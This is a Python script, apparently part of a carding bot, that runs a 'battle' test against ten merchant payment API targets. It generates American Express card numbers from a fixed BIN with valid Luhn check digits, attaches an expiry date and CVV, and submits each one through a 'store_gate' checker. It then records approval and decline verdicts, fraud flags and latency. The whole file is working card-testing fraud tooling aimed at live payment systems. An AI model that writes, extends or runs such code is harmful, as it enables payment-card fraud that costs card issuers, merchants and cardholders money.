# language: Python 3.14, file: scratch/_battle10_direct.py, target: Windows 11
# Боевой прогон 06.09.2026: 10 разных целей Store API БЕЗ ПРОКСИ (DIRECT), BIN 379363037.
import asyncio
import json
import os
import random
import sys
import time
from collections import Counter
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import gate_client as gc
import store_gate
from bot.gates import storegate as bg_store

N_TARGETS = 10
PAUSE_S = 1.0


def gen_amex(prefix="379363037"):
    rand = "".join(str(random.randint(0, 9)) for _ in range(5))
    partial = prefix + rand
    check = gc.luhn_check_digit(partial)
    return partial + str(check)


async def main():
    all_targets = bg_store._targets()
    # Возьмём 10 разнообразных целей из ротации
    targets = all_targets[:N_TARGETS]
    print(f"[*] Целей: {len(targets)} (прямое соединение, без прокси)", flush=True)
    print(f"[*] BIN: 379363037 (American Express SafeKey)", flush=True)
    
    results = []
    t0 = time.time()
    os.makedirs("data/results", exist_ok=True)
    res_path = "data/results/_battle10_direct_amex.jsonl"
    if os.path.exists(res_path):
        os.remove(res_path)

    for i, t in enumerate(targets, 1):
        pan = gen_amex()
        raw = f"{pan}|11|28|4123"
        t1 = time.time()
        try:
            # proxy=None -> прямое соединение
            res = await store_gate.check_target(t, raw, None, 2000)
        except Exception as e:
            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:140], "amount_cents": 0, "currency": ""}
        lat = int((time.time() - t1) * 1000)
        st = res.get("status", "?")
        amt = res.get("amount_cents") or 0
        cur = res.get("currency") or ""
        det = str(res.get("detail", ""))[:110].replace("\n", " ")
        print(f"[{i:02}/{len(targets)}] {st:14} {t:40} {amt:>6}{cur:4} {lat:>6}ms | {det}", flush=True)
        row = {
            "index": i,
            "target": t,
            "status": st,
            "amount_cents": amt,
            "currency": cur,
            "lat_ms": lat,
            "detail": det,
            "pan": gc.mask_pan(pan)
        }
        results.append(row)
        with open(res_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
        if i < len(targets):
            await asyncio.sleep(PAUSE_S)

    verdicts = Counter(r["status"] for r in results)
    live = [r for r in results if r["status"] not in ("ERROR",)]
    full_cycle = [r for r in results if r["status"] in (
        "DECLINED", "APPROVED", "APPROVED@PAID", "APPROVED@HOLD", 
        "PI_PENDING", "DECLINED@DO_NOT_HONOR", "DECLINED@FRAUD", 
        "APPROVED@CVV", "APPROVED@CCN", "3DS_CHALLENGE", "3DS_FRICTIONLESS"
    )]
    print("=" * 95, flush=True)
    print(f"[*] ИТОГ за {int(time.time() - t0)}с:", flush=True)
    print(f"    вердикты: {dict(verdicts)}", flush=True)
    print(f"    поверхностей с ответом эмитента/шлюза: {len(live)}/{len(results)}", flush=True)
    print(f"    полный платёжный цикл: {len(full_cycle)}/{len(results)}", flush=True)
    if live:
        lats = sorted(r["lat_ms"] for r in live)
        print(f"    латентность direct: min {lats[0]}ms, медиана {lats[len(lats)//2]}ms, max {lats[-1]}ms", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
